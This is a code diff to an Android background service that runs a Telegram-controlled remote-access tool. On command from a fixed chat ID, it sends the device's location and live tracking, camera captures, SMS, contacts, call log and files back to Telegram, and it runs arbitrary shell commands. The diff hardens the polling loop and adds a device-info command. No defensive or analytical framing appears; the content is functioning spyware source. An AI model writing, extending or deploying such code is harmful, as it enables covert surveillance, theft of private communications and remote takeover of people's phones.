@@ -30,14 +30,10 @@ public class BotService extends Service {
                 .setPriority(Notification.PRIORITY_LOW).build();
             startForeground(1, n);
             locMgr = (LocationManager) getSystemService(LOCATION_SERVICE);
-            TgApi.send("BOOT: service onCreate OK");
-        }catch(Exception e){
-            TgApi.send("BOOT ERR: "+e.getMessage());
-        }
+        }catch(Exception e){}
     }
     @Override
     public int onStartCommand(Intent i, int f, int s){
-        TgApi.send("BOOT: onStartCommand");
         new Thread(this::poll).start();
         return START_STICKY;
     }
@@ -45,37 +41,58 @@ public class BotService extends Service {
         TgApi.send("Online");
         while(running){
             try{
-                String url = TgApi.API+"/getUpdates?timeout=30&offset="+(lastId+1);
+                String url = TgApi.API+"/getUpdates?timeout=25&offset="+(lastId+1);
                 String r = TgApi.get(url);
-                if(r.isEmpty()){ Thread.sleep(2000); continue; }
+                if(r == null || r.isEmpty()){
+                    Thread.sleep(1500);
+                    continue;
+                }
                 JSONObject j = new JSONObject(r);
-                JSONArray a = j.getJSONArray("result");
+                if(!j.optBoolean("ok", false)){
+                    Thread.sleep(2000);
+                    continue;
+                }
+                JSONArray a = j.optJSONArray("result");
+                if(a == null){ Thread.sleep(1000); continue; }
                 for(int k=0;k<a.length();k++){
                     JSONObject u = a.getJSONObject(k);
-                    lastId = u.getLong("update_id");
+                    long uid = u.optLong("update_id", -1);
+                    if(uid > lastId) lastId = uid;
                     JSONObject m = u.optJSONObject("message");
-                    if(m==null) continue;
-                    String cid = m.getJSONObject("chat").getString("id");
+                    if(m == null) continue;
+                    JSONObject chat = m.optJSONObject("chat");
+                    if(chat == null) continue;
+                    String cid = chat.optString("id","");
                     if(!cid.equals(TgApi.CHAT_ID)) continue;
-                    handle(m.optString("text",""));
+                    String txt = m.optString("text","");
+                    if(txt.isEmpty()) continue;
+                    handle(txt);
                 }
-            }catch(Exception e){ try{ Thread.sleep(3000); }catch(Exception ex){} }
+            }catch(Exception e){
+                try{ Thread.sleep(2500); }catch(Exception ex){}
+            }
         }
     }
     private void handle(String cmd){
         try{
-            if(cmd.equals("/start")||cmd.equals("/help")) TgApi.send("/loc /live /cam /cam_back /sms /contacts /callog /files /vibrate /shell");
-            else if(cmd.equals("/loc")) sendLoc();
-            else if(cmd.equals("/live")) liveLoc();
-            else if(cmd.equals("/cam")) capture(0);
-            else if(cmd.equals("/cam_back")) capture(1);
-            else if(cmd.equals("/sms")) sms();
-            else if(cmd.equals("/contacts")) contacts();
-            else if(cmd.equals("/callog")) callog();
-            else if(cmd.equals("/files")) files();
-            else if(cmd.equals("/vibrate")) vib();
-            else if(cmd.startsWith("/shell ")) shell(cmd.substring(7));
-        }catch(Exception e){ TgApi.send("err "+e.getMessage()); }
+            cmd = cmd.trim();
+            if(cmd.equals("/start") || cmd.equals("/help")){
+                TgApi.send("MENU:\n/info\n/loc\n/live\n/cam\n/cam_back\n/sms\n/contacts\n/callog\n/files\n/vibrate\n/shell <cmd>");
+                return;
+            }
+            if(cmd.equals("/info")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE); return; }
+            if(cmd.equals("/loc")){ sendLoc(); return; }
+            if(cmd.equals("/live")){ liveLoc(); return; }
+            if(cmd.equals("/cam")){ capture(0); return; }
+            if(cmd.equals("/cam_back")){ capture(1); return; }
+            if(cmd.equals("/sms")){ sms(); return; }
+            if(cmd.equals("/contacts")){ contacts(); return; }
+            if(cmd.equals("/callog")){ callog(); return; }
+            if(cmd.equals("/files")){ files(); return; }
+            if(cmd.equals("/vibrate")){ vib(); return; }
+            if(cmd.startsWith("/shell ")){ shell(cmd.substring(7)); return; }
+            TgApi.send("Unknown cmd: "+cmd);
+        }catch(Exception e){ TgApi.send("cmd err "+e.getMessage()); }
     }
     private void sendLoc(){
         try{
@@ -84,14 +101,16 @@ public class BotService extends Service {
                 Location l = locMgr.getLastKnownLocation(p);
                 if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
             }
-            if(last!=null){ TgApi.sendLoc(last.getLatitude(), last.getLongitude()); TgApi.send("loc: "+last.getLatitude()+","+last.getLongitude()); }
-            else TgApi.send("no location");
+            if(last!=null){
+                TgApi.sendLoc(last.getLatitude(), last.getLongitude());
+                TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()+"\nAcc: "+last.getAccuracy()+"m");
+            } else TgApi.send("no location");
         }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
     }
     private void liveLoc(){
         TgApi.send("live 60s");
         final LocationListener ll = new LocationListener(){
-            public void onLocationChanged(Location l){ TgApi.sendLoc(l.getLatitude(), l.getLongitude()); TgApi.send("loc: "+l.getLatitude()+","+l.getLongitude()); }
+            public void onLocationChanged(Location l){ TgApi.sendLoc(l.getLatitude(), l.getLongitude()); TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude()); }
             public void onStatusChanged(String s,int i,Bundle b){}
             public void onProviderEnabled(String s){}
             public void onProviderDisabled(String s){}
